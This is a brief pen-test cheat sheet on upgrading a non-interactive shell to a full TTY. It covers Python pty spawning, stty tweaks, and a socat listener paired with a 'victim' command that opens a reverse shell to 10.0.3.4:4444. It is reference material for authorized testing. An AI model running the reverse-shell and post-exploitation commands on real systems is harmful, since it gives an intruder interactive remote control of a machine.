
# Interactive shell

> Often during pen tests you may obtain a shell without having tty, yet wish to interact further with the system. Here are some commands which will allow you to spawn a tty shell. Obviously some of this will depend on the system environment and installed packages.

## Python psuedo terminal

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Python fully Interactive TTY

1. Spawn a TTY shell
```shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

2. Upgrade to Full Interactive Shell
```shell
export TERM=xterm
```

```shell
[Ctrl + Z]
```

```shell
stty raw -echo; fg
```

```shell
stty rows 38 columns 116
```

## Socat shell

### Listener

```shell
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
### Victim

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

## 📚 References

* [blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
* [fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1](https://fahmifj.medium.com/get-a-fully-interactive-reverse-shell-b7e8d6f5b1c1)